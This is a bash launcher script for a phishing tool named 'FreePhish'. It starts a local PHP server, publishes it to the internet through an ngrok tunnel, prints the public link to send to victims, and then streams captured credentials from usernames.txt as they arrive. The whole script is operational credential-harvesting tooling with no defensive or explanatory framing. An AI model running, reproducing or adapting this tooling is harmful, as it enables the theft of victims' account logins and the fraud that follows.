#/bin/bash
clear
echo ""
echo ""
echo ""
figlet -c Turn On mobile data and Hotspot
sleep 6
echo ""
echo ""
echo ""
php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
cat logo.txt
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m FreePhish \e[0m\e[1;33m]\e[0m\e[1;32m ## Starting Php Server \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m FreePhish \e[0m\e[1;33m]\e[0m\e[1;32m ## Starting Ngrok Server \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m FreePhish \e[1;33m] Link :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m ## Credentials  \e[0m'
                  echo ""
                  tail -f usernames.txt
